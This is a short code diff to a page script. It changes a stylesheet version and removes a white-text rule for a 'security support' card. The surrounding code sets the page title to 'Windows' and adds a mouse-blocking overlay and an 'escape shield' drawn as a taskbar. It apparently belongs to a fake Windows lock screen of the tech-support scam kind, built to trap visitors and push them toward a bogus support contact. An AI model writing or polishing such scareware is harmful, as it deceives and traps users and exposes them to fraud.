@@ -5,14 +5,13 @@
   if (!document.querySelector('link[href*="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=16";
+    styleLink.href = "styles.css?v=17";
     document.head.appendChild(styleLink);
   }
 
   document.title = "Windows";
 
   mount.innerHTML =
-    '<style id="support-card-force-white">#securitySupportCard,#securitySupportCard p,#securitySupportCard div{color:#ffffff!important;-webkit-text-fill-color:#ffffff!important}</style>' +
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
